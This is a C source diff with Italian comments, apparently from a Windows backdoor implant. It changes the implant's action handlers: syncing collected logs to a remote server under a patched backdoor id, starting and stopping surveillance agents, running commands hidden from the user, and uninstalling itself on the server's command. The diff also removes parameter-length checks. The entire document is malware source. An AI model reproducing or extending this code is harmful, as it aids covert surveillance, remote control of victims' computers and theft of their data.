@@ -5,6 +5,7 @@
 
 extern BOOL IsDeepFreeze();
 extern void UnlockConfFile();
+extern BYTE bin_patched_backdoor_id[];
 
 // Codici delle action function
 #define AF_SYNCRONIZE 1
@@ -30,18 +31,18 @@ BOOL bInstantActionThreadSemaphore = FALSE;
 HANDLE hInstantActionThread = NULL;
 
 // Dichiarazione delle possibili azioni
-BOOL WINAPI DA_Uninstall(BYTE *dummy_param, DWORD dummy_len);
-BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len);
-BOOL WINAPI DA_StartAgent(BYTE *agent_tag, DWORD param_len);
-BOOL WINAPI DA_StopAgent(BYTE *agent_tag, DWORD param_len);
-BOOL WINAPI DA_Execute(BYTE *command, DWORD command_len);
-BOOL WINAPI DA_LogInfo(WCHAR *info, DWORD info_len);
+BOOL WINAPI DA_Uninstall(BYTE *dummy_param);
+BOOL WINAPI DA_Syncronize(BYTE *action_param);
+BOOL WINAPI DA_StartAgent(BYTE *agent_tag);
+BOOL WINAPI DA_StopAgent(BYTE *agent_tag);
+BOOL WINAPI DA_Execute(BYTE *command);
+BOOL WINAPI DA_LogInfo(WCHAR *info);
 
 // Dichiarazione del thread che puo' essere ristartato dalla sync
 DWORD WINAPI FastActionsThread(DWORD);
 
 // Scrive un log di tipo info
-BOOL WINAPI DA_LogInfo(BYTE *info, DWORD info_len)
+BOOL WINAPI DA_LogInfo(BYTE *info)
 {
 	WCHAR info_string[1024];
 	_snwprintf_s(info_string, 1024, _TRUNCATE, L"[User]: %s", (WCHAR *)info);
@@ -53,14 +54,14 @@ BOOL WINAPI DA_LogInfo(BYTE *info, DWORD info_len)
 }
 
 // Esegue una sincronizzazione
-BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len)
+BOOL WINAPI DA_Syncronize(BYTE *action_param)
 {
 	typedef struct {
 		DWORD min_sleep;
 		DWORD max_sleep;
 		DWORD band_limit;
-		//BOOL  exit_after_completion;
-		char conf_string[1];
+		BOOL  exit_after_completion;
+		char asp_server[1];
 	} sync_conf_struct;
 	sync_conf_struct *sync_conf;
 	DWORD ret_val; 
@@ -82,18 +83,14 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len)
 	// terminated. Deve essere cura del server inviare una
 	// configurazione corretta.
 	sync_conf = (sync_conf_struct *)action_param;
-	asp_server = sync_conf->conf_string;
-	unique_id = strchr(asp_server, 0) + 1;
-
-	// XXXXXXXXXXXXXXXXXXXX - Deve essere inserito come nuovo parametro della sync
-	//exit_after_completion = sync_conf->exit_after_completion;
-	exit_after_completion = FALSE;
-
+	asp_server = sync_conf->asp_server;
+	unique_id = (char *)bin_patched_backdoor_id;
+	exit_after_completion = sync_conf->exit_after_completion;
 
 	// Quando riceve l'uninstall la funzione ritorna comunque FALSE
 	if (!LOG_StartLogConnection(asp_server, unique_id, &uninstall, &actual_time, availables, sizeof(availables))) {
 		if (uninstall) 
-			DA_Uninstall(NULL, NULL);
+			DA_Uninstall(NULL);
 		return FALSE;
 	}
 
@@ -158,10 +155,10 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len)
 
 
 // Fa partire un agent
-BOOL WINAPI DA_StartAgent(BYTE *agent_tag, DWORD param_len)
+BOOL WINAPI DA_StartAgent(BYTE *agent_tag)
 {
 	// Verifica che il parametro agent_tag sia corretto (una DWORD)
-	if (!agent_tag || param_len!=4)
+	if (!agent_tag)
 		return FALSE;
 
 	EnterCriticalSection(&action_critic_sec);
@@ -172,10 +169,10 @@ BOOL WINAPI DA_StartAgent(BYTE *agent_tag, DWORD param_len)
 
 
 // Fa fermare un agent
-BOOL WINAPI DA_StopAgent(BYTE *agent_tag, DWORD param_len)
+BOOL WINAPI DA_StopAgent(BYTE *agent_tag)
 {
 	// Verifica che il parametro agent_tag sia corretto (una DWORD)
-	if (!agent_tag || param_len!=4)
+	if (!agent_tag)
 		return FALSE;
 
 	EnterCriticalSection(&action_critic_sec);
@@ -185,10 +182,10 @@ BOOL WINAPI DA_StopAgent(BYTE *agent_tag, DWORD param_len)
 }
 
 // Abilita un evento
-BOOL WINAPI DA_StartEvent(BYTE *event_id, DWORD param_len)
+BOOL WINAPI DA_StartEvent(BYTE *event_id)
 {
 	// Verifica che il parametro agent_tag sia corretto (una DWORD)
-	if (!event_id || param_len!=4)
+	if (!event_id)
 		return FALSE;
 
 	SM_EventTableState(*(DWORD *)event_id, TRUE);
@@ -197,10 +194,10 @@ BOOL WINAPI DA_StartEvent(BYTE *event_id, DWORD param_len)
 
 
 // Disabilita un evento
-BOOL WINAPI DA_StopEvent(BYTE *event_id, DWORD param_len)
+BOOL WINAPI DA_StopEvent(BYTE *event_id)
 {
 	// Verifica che il parametro agent_tag sia corretto (una DWORD)
-	if (!event_id || param_len!=4)
+	if (!event_id)
 		return FALSE;
 
 	SM_EventTableState(*(DWORD *)event_id, FALSE);
@@ -208,7 +205,7 @@ BOOL WINAPI DA_StopEvent(BYTE *event_id, DWORD param_len)
 }
 
 // Esegue un comando in maniera nascosta
-BOOL WINAPI DA_Execute(BYTE *command, DWORD command_len)
+BOOL WINAPI DA_Execute(BYTE *command)
 {
 	STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -238,7 +235,7 @@ BOOL WINAPI DA_Execute(BYTE *command, DWORD command_len)
 
 
 // Disinstalla il programma
-BOOL WINAPI DA_Uninstall(BYTE *dummy_param, DWORD dummy_len)
+BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 {
 	char conf_path[DLLNAMELEN];
 
